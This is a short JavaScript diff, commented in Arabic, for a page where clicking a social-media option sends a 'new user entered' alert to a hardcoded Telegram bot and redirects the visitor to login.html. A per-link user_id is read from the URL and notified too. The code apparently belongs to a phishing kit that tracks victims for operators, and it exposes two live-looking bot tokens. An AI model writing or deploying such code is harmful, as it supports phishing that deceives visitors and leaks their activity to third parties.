@@ -1,31 +1,28 @@
-function sendToBot(message) {
-    const botToken = "7681653454:AAEdoXFfTtBOxL8F3i06jWeBWQjeQjlP-RQ";
-    const chatId = "user_id";
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+function getUserFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("user_id") || "غير معروف"; // استخراج user_id من الرابط
+}
 
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log("Message sent successfully");
-            } else {
-                console.log("Failed to send message");
-            }
-        })
-        .catch(error => console.error('Error sending message to bot:', error));
+function sendToBot(message) {
+    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E";
+    const mainChatId = "5375214810"; // المعرف الأساسي
+    const userId = getUserFromURL(); // المعرف الخاص بالمستخدم
+
+    const fullMessage = `🦅 مستخدم جديد دخل!\n🚩 المصدر: ${message}\n👤 اليوزر: ${userId}`;
+
+    // إرسال الرسالة للمعرف الأساسي
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${mainChatId}&text=${encodeURIComponent(fullMessage)}`);
+
+    // إرسال الرسالة لمعرف المستخدم اللي دخل من الرابط (لو مش "غير معروف")
+    if (userId !== "غير معروف") {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(fullMessage)}`);
+    }
 }
 
 document.querySelectorAll(".social-item").forEach(item => {
     item.addEventListener("click", function() {
         let socialPlatform = this.querySelector("span").textContent;
-        sendToBot(`المستخدم دخل من قسم🚩🦅 ${socialPlatform}`);
+        sendToBot(socialPlatform);
         window.location.href = "login.html";
-    });
-});
-
-document.querySelectorAll(".buy-btn").forEach(button => {
-    button.addEventListener("click", function() {
-        let loginMessage = document.getElementById("login-warning");
-        loginMessage.style.display = "block";
     });
 });
